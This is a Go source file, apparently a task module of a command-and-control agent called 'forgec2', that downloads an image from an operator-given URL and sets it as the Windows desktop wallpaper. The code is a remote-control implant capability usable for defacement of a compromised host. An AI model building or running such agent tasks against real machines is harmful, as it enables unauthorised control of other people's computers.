//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

// Desktop wallpaper control (Windows only; other platforms report an error).
// The platform activation lives in task_desktop_windows.go with a stub in
// task_desktop_unix.go — this file holds dispatch plus the pure helpers so
// the style mapping stays unit-tested on every platform.

// wallpaperStyleValues maps a style name to the WallpaperStyle/TileWallpaper
// registry values Windows honors. Empty means the default (fill).
func wallpaperStyleValues(style string) (wallpaperStyle, tileWallpaper string, err error) {
	switch strings.ToLower(strings.TrimSpace(style)) {
	case "", "fill":
		return "10", "0", nil
	case "fit":
		return "6", "0", nil
	case "stretch":
		return "2", "0", nil
	case "tile":
		return "0", "1", nil
	case "center":
		return "0", "0", nil
	case "span":
		return "22", "0", nil
	default:
		return "", "", fmt.Errorf("wallpaper: unknown style %q (want fill, fit, stretch, tile, center or span)", style)
	}
}

// wallpaperDestPath derives a temp file path for a downloaded image,
// preserving common image extensions so the shell treats it as a picture.
func wallpaperDestPath(src string) string {
	ext := ".jpg"
	if i := strings.LastIndex(src, "."); i >= 0 {
		if q := strings.Index(src[i:], "?"); q >= 0 {
			// Strip query strings before sniffing the extension.
			if cand := strings.ToLower(src[i : i+q]); validWallpaperExt(cand) {
				ext = cand
			}
		} else if cand := strings.ToLower(src[i:]); validWallpaperExt(cand) && len(cand) <= 5 {
			ext = cand
		}
	}
	return filepath.Join(os.TempDir(), "forgec2-wallpaper"+ext)
}

func validWallpaperExt(ext string) bool {
	switch ext {
	case ".jpg", ".jpeg", ".png", ".bmp", ".gif":
		return true
	default:
		return false
	}
}

func handleWallpaper(task Task, res *TaskResult) {
	src := strings.TrimSpace(task.Command)
	if src == "" {
		src = strings.TrimSpace(task.Path)
	}
	if src == "" {
		res.Error = "wallpaper: image URL or local path required (command)"
		return
	}
	style := strings.TrimSpace(task.Data)
	if style == "" {
		style = strings.TrimSpace(task.Shell)
	}
	if _, _, err := wallpaperStyleValues(style); err != nil {
		res.Error = err.Error()
		return
	}
	if style == "" {
		style = "fill"
	}
	if runtime.GOOS != "windows" {
		res.Error = "wallpaper is only supported on Windows agents"
		return
	}
	imgPath := src
	lower := strings.ToLower(src)
	if strings.HasPrefix(lower, "http://") || strings.HasPrefix(lower, "https://") {
		imgPath = wallpaperDestPath(src)
		if err := downloadFromURL(src, imgPath); err != nil {
			res.Error = err.Error()
			return
		}
	} else if _, err := os.Stat(src); err != nil {
		res.Error = fmt.Sprintf("wallpaper: cannot access image %s", src)
		return
	}
	if err := setDesktopWallpaper(imgPath, style); err != nil {
		res.Error = err.Error()
		return
	}
	res.Output = fmt.Sprintf("wallpaper set to %s (%s)", src, style)
}
